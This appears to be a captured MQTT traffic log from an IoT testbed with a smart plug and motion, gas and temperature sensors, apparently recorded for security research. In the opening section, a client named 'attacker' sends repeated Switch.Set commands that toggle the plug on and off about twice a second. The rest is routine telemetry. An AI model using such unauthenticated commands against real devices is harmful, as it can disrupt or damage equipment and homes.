2026-04-22T16:40:30,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34563.67,""swi"
2026-04-22T16:40:30,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5657 34563.692 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:31,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:31,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5658 34564.176 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:31,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:31,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34564.17,""swi"
2026-04-22T16:40:31,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5659 34564.194 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:31,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:31,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5660 34564.676 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:31,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:31,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34564.67,""swi"
2026-04-22T16:40:31,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5661 34564.693 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:32,iot/pir/binary_sensor/motion/state,3,OFF
2026-04-22T16:40:32,iot/pir/debug,50,[0;36m[D][binary_sensor:048]: 'Motion' >> OFF[0m
2026-04-22T16:40:32,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:32,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5662 34565.177 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:32,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:32,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34565.17,""swi"
2026-04-22T16:40:32,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5663 34565.196 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:32,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:32,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5664 34565.677 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:32,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:32,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34565.67,""swi"
2026-04-22T16:40:32,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5665 34565.694 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:33,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:33,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5666 34566.178 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:33,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:33,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34566.18,""swi"
2026-04-22T16:40:33,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5667 34566.197 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:33,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:33,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5668 34566.681 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:33,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:33,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34566.68,""swi"
2026-04-22T16:40:33,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5669 34566.697 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:34,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:34,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5670 34567.187 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:34,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:34,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34567.18,""swi"
2026-04-22T16:40:34,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5671 34567.206 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:34,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:34,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5672 34567.688 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:34,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:34,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34567.69,""swi"
2026-04-22T16:40:34,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5673 34567.705 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:35,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:35,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5674 34568.193 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:35,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:35,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:35,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:35,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34568.19,""swi"
2026-04-22T16:40:35,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5675 34568.211 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:35,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:35,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5676 34568.689 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:35,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:35,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34568.69,""swi"
2026-04-22T16:40:35,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5677 34568.706 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:36,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:36,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5678 34569.190 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:36,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:36,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34569.19,""swi"
2026-04-22T16:40:36,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5679 34569.209 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:40:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:40:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:40:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:40:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:40:40,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:40,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:45,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:45,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:40:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:40:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:40:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:40:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:40:50,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:50,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:55,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:55,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:40:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:40:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:40:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:40:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:41:00,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:41:00,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:41:05,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:41:05,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:41:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:41:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:41:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:41:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:41:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:41:10,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:41:10,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:41:15,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:41:15,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:41:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:41:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:41:16,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:41:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:41:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:41:20,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:41:20,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:41:25,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:41:25,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:41:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:41:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:41:26,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:41:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:41:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:41:30,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:41:30,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:41:35,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:41:35,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:41:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:41:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:41:37,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:41:37,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:41:37,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:41:40,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:41:40,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:41:45,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:41:45,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:41:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:41:47,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:41:47,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:41:47,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:41:47,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:41:50,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:41:50,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:41:55,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:41:55,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:41:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 25.0°C Humidity 39.0%[0m
2026-04-22T16:41:57,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 25.0 °C[0m
2026-04-22T16:41:57,iot/dht11/sensor/temperature/state,4,25.0
2026-04-22T16:41:57,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:41:57,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:42:00,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:42:00,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:42:05,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:42:05,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:42:06,iot/pir/binary_sensor/motion/state,2,ON
2026-04-22T16:42:06,iot/pir/debug,49,[0;36m[D][binary_sensor:048]: 'Motion' >> ON[0m
2026-04-22T16:42:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:42:07,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:42:07,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:42:07,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:42:07,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:42:10,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:42:10,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:42:15,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:42:15,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:42:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 25.0°C Humidity 39.0%[0m
2026-04-22T16:42:17,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 25.0 °C[0m
2026-04-22T16:42:17,iot/dht11/sensor/temperature/state,4,25.0
2026-04-22T16:42:17,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:42:17,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:42:20,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:42:20,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:42:25,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:42:25,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:42:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 25.0°C Humidity 39.0%[0m
2026-04-22T16:42:27,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 25.0 °C[0m
2026-04-22T16:42:27,iot/dht11/sensor/temperature/state,4,25.0
2026-04-22T16:42:27,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:42:27,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:42:30,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:42:30,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:42:35,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:42:35,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:42:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:42:37,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:42:37,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:42:37,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:42:37,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:42:40,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:42:40,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:42:45,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:42:45,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:42:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 25.0°C Humidity 39.0%[0m
2026-04-22T16:42:47,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 25.0 °C[0m
2026-04-22T16:42:47,iot/dht11/sensor/temperature/state,4,25.0
2026-04-22T16:42:47,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:42:47,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:42:50,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:42:50,iot/mq/sensor/gas_sensor/state,4,0.56
